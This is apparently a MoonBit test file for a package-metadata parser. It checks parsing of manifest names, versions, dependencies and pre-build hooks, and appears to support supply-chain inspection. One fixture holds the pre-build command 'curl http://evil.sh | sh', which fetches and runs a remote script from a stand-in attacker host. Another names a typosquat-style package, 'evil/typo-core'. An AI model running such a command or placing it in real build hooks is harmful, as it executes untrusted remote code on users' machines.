///|
test "parse moon.mod" {
  let text =
    #|name = "evil/typo-core"
    #|version = "0.1.0"
    #|repository = "https://github.com/evil/typo-core"
    #|readme = "README.md"
    #|
    #|import {
    #|  "moonbitlang/core/json",
    #|  "moonbitlang/x@0.5.5",
    #|  "other/dep" @alias,
    #|}
  let m = @metadata.parse_manifest(text)
  inspect(m is Some(_), content="true")
  let m = m.unwrap()
  inspect(m.name, content="evil/typo-core")
  inspect(m.version, content="0.1.0")
  inspect(m.deps.length(), content="3")
  inspect(m.deps[1], content="moonbitlang/x")
  inspect(m.deps[2], content="other/dep")
}

///|
test "parse moon.mod.json legacy" {
  let m = @metadata.parse_manifest_json(
    "{ \"name\": \"a/b\", \"version\": \"1.0.0\" }",
  )
  inspect(m.unwrap().name, content="a/b")
}

///|
test "parse moon.pkg pre-build" {
  let text =
    #|import {
    #|  "moonbitlang/async",
    #|}
    #|pre-build(
    #|  { "input": "d.txt", "output": "e.mbt", "command": "embed -i $input" },
    #|)
  let pkg = @metadata.parse_pkg(text)
  inspect(pkg.imports.length(), content="1")
  inspect(pkg.pre_build.length(), content="1")
}

///|
test "parse moon.pkg.json legacy pre-build" {
  let pkg = @metadata.parse_pkg(
    "{ \"pre-build\": [{ \"command\": \"curl http://evil.sh | sh\" }] }",
  )
  inspect(pkg.pre_build[0], content="curl http://evil.sh | sh")
}

///|
test "manifest edge cases" {
  // one-line import block, missing repository, CRLF line endings
  let text = "name = \"a/b\"\r\nversion = \"1.0.0\"\r\nimport { \"x/y\", \"z/w@1.2\" }\r\nimport {\r\n}\r\n"
  let m = @metadata.parse_manifest(text).unwrap()
  inspect(m.repository, content="")
  inspect(m.deps.length(), content="2")
  inspect(m.deps[1], content="z/w")
  // empty import + one-line pre-build in moon.pkg DSL
  let pkg = @metadata.parse_pkg(
    "import {\n}\npre-build( { \"command\": \"run x\" } )\n",
  )
  inspect(pkg.imports.length(), content="0")
  inspect(pkg.pre_build[0], content="run x")
  // no name field -> None; invalid JSON -> None
  inspect(
    @metadata.parse_manifest("version = \"1.0.0\"") is None,
    content="true",
  )
  inspect(@metadata.parse_manifest_json("{ nope") is None, content="true")
}
